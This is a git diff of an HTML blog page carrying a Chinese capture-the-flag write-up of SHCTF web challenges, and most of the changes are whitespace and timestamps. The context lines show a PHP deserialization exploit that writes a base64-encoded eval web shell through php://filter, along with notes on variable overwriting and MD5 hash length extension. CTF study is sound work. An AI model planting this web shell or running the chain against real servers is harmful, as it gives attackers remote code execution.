@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://ni0duann.github.io/images/SHCTF/Snipaste_2023-11-05_23-22-57.png">
 <meta property="og:image" content="https://ni0duann.github.io/images/SHCTF/Snipaste_2023-11-05_23-28-01.png">
 <meta property="article:published_time" content="2023-11-05T05:41:22.000Z">
-<meta property="article:modified_time" content="2023-11-07T17:51:08.553Z">
+<meta property="article:modified_time" content="2023-11-07T17:54:41.889Z">
 <meta property="article:author" content="Ni0duann">
 <meta property="article:tag" content="web新生赛">
 <meta name="twitter:card" content="summary">
@@ -447,7 +447,7 @@ class CTF{
 <pre><code>&#125;
 </code></pre>
 <p>}<br>$a &#x3D; new Start();<br>$b &#x3D; new CTF();<br>$a-&gt;barking &#x3D; $b;<br>$b-&gt;part1 &#x3D; ‘php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;5.php’;<br>$b-&gt;part2 &#x3D; ‘aaPD9waHAgQGV2YWwoJF9HRVRbJzEnXSk7Pz4&#x3D;’;<br>echo serialize($a);<br>?&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](../images/SHCTF/Snipaste_2023-11-07_00-23-26.png)</span><br><span class="line"></span><br><span class="line"># MD5的事就拜托了</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](../images/SHCTF/Snipaste_2023-11-07_00-23-26.png)</span><br><span class="line"></span><br><span class="line"># MD5的事就拜托了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <?php
 highlight_file(__FILE__);
 include("flag.php");
@@ -470,14 +470,15 @@ if($_POST['SHCTF']!=md5($flag)){
         echo("flag is".$flag);
     }
 }
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$$$变量双重覆盖结合parse_url函数</span><br><span class="line">而extract()刚好可以结合pare_url函数绕过变量覆盖</span><br><span class="line">作用：parse_url — 解析 URL，返回其组成部分</span><br><span class="line">原来及exp如下</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$$$变量双重覆盖结合parse_url函数</span><br><span class="line">而extract()刚好可以结合pare_url函数绕过变量覆盖</span><br><span class="line">作用：parse_url — 解析 URL，返回其组成部分</span><br><span class="line">原来及exp如下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <?php
 $url = 'http://user:pass@host/path?args=value#anch';
 print_r(parse_url($url));
 echo parse_url($url, PHP_URL_PATH);
 ?>
 <p>结果：<br>Array<br>(<br>    [scheme] &#x3D;&gt; http<br>    [host] &#x3D;&gt; host<br>    [user] &#x3D;&gt; user<br>    [pass] &#x3D;&gt; pass<br>    [path] &#x3D;&gt; &#x2F;path<br>    [query] &#x3D;&gt; args&#x3D;value<br>    [fragment] &#x3D;&gt; anch<br>)</p>
-<pre><code>isset大于1的小数即可
+<pre><code>
+isset大于1的小数即可
 MD5的Hash长度扩展攻击原理及应用
 https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/
 ![Alt text](../images/SHCTF/Snipaste_2023-11-07_10-54-58.png)
@@ -494,7 +495,7 @@ https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/
             
         </div>
         <footer class="article-footer">
-            <a data-url="https://ni0duann.github.io/2023/11/05/SHCTH203WEB-wp/" data-id="cloomo6wo0004tog23dcvh2fa" data-title="SHCTH203WEB_wp"
+            <a data-url="https://ni0duann.github.io/2023/11/05/SHCTH203WEB-wp/" data-id="cloomsnxw00016cg22eynflbc" data-title="SHCTH203WEB_wp"
                class="article-share-link">分享</a>
             
             
